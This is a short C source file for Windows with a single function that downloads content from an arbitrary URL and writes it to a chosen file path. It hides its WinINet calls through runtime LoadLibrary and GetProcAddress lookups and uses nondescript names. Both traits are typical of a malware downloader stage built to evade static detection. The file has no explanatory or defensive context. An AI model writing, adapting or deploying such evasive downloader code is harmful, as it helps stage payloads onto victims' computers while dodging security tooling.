#include <windows.h>
#include <wininet.h>

typedef HINTERNET (WINAPI* pIO)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI* pIOU)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI* pIRF)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI* pICH)(HINTERNET);
void __attribute__((noinline)) __attribute__((used)) routine_v3(const char* url, const char* dest){
    HMODULE hM = LoadLibraryA("wininet.dll");
    if (!hM) return;

    pIO _InternetOpenA = (pIO)GetProcAddress(hM, "InternetOpenA");
    pIOU _InternetOpenUrlA = (pIOU)GetProcAddress(hM, "InternetOpenUrlA");
    pIRF _InternetReadFile = (pIRF)GetProcAddress(hM, "InternetReadFile");
    pICH _InternetCloseHandle = (pICH)GetProcAddress(hM, "InternetCloseHandle");

    HINTERNET hI = _InternetOpenA("W", 1, NULL, NULL, 0);
    if (hI) {
        HINTERNET hU = _InternetOpenUrlA(hI, url, NULL, 0, 0x80000000, 0);
        if (hU) {
            HANDLE hF = CreateFileA(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 128, NULL);
            if (hF != INVALID_HANDLE_VALUE) {
                char b[2048];
                DWORD r, w;
                while (_InternetReadFile(hU, b, 2048, &r) && r > 0) {
                    WriteFile(hF, b, r, &w, NULL);
                }
                CloseHandle(hF);
            }
            _InternetCloseHandle(hU);
        }
        _InternetCloseHandle(hI);
    }
    FreeLibrary(hM);
}